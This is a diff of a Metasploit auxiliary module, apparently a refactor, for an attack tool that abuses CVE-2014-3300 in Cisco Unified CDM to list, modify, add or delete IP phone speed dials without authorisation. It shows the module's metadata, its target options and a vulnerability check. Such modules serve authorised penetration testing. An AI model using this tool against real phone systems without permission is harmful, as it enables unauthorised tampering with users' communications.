@@ -10,44 +10,35 @@ class Metasploit3 < Msf::Auxiliary
 
   include Msf::Exploit::Remote::HttpClient
 
-  def initialize(info = {})
-    super(
-      'Name'        => 'Viproy CUCDM IP Phone XML Services - Speed Dial Attack Tool',
-      'Description' => %q{
+  def initialize(info={})
+    super(update_info(info,
+      'Name'          => 'Viproy CUCDM IP Phone XML Services - Speed Dial Attack Tool',
+      'Description'   => %q{
         The BVSMWeb portal in the web framework in Cisco Unified Communications Domain Manager (CDM)
         in Unified CDM Application Software before 10 does not properly implement access control,
         which allows remote attackers to modify user information. This vulnerability can be exploited
         for unauthorised speeddial manipulation using this module. This tool can be tested with the fake
         voss-xmlservice component of Viproy.
       },
-      'Author'      => 'fozavci',
-      'References'     =>
-          [
-              ['CVE', '2014-3300'],
-              ['BID', '68331']
-          ],
-      'License'     => MSF_LICENSE,
-      'Actions'     =>
-          [
-              [ 'List', {
-                  'Description' => 'Getting the speeddials for the MAC address.'
-              } ],
-              [ 'Modify', {
-                  'Description' => 'Modifying a speeddial for the MAC address.'
-              } ],
-              [ 'Add', {
-                  'Description' => 'Adding a speeddial for the MAC address.'
-              } ],
-              [ 'Delete', {
-                  'Description' => 'Deleting a speeddial for the MAC address.'
-              } ]
-          ],
+      'Author'        => 'fozavci',
+      'References'    =>
+        [
+          ['CVE', '2014-3300'],
+          ['BID', '68331']
+        ],
+      'License'       => MSF_LICENSE,
+      'Actions'       =>
+        [
+          [ 'List',   { 'Description' => 'Getting the speeddials for the MAC address' } ],
+          [ 'Modify', { 'Description' => 'Modifying a speeddial for the MAC address' } ],
+          [ 'Add',    { 'Description' => 'Adding a speeddial for the MAC address' } ],
+          [ 'Delete', { 'Description' => 'Deleting a speeddial for the MAC address' } ]
+        ],
       'DefaultAction'  => 'List'
-    )
+    ))
 
     register_options(
     [
-      Opt::RPORT(80),
       OptString.new('TARGETURI', [ true, 'Target URI for XML services', '/bvsmweb']),
       OptString.new('MAC', [ true, 'MAC Address of target phone', '000000000000']),
       OptString.new('NAME', [ false, 'Name for Speed Dial', 'viproy']),
@@ -122,10 +113,11 @@ class Metasploit3 < Msf::Auxiliary
   def send_rcv(uri)
     uri=normalize_uri(uri.to_s)
     res = send_request_cgi(
-        {
-            'uri'    => uri,
-            'method' => 'GET',
-        })
+      {
+        'uri'    => uri,
+        'method' => 'GET',
+      })
+
     if res and res.code == 200 and res.body =~ /Speed [D|d]ial/
       return Exploit::CheckCode::Vulnerable,res
     else
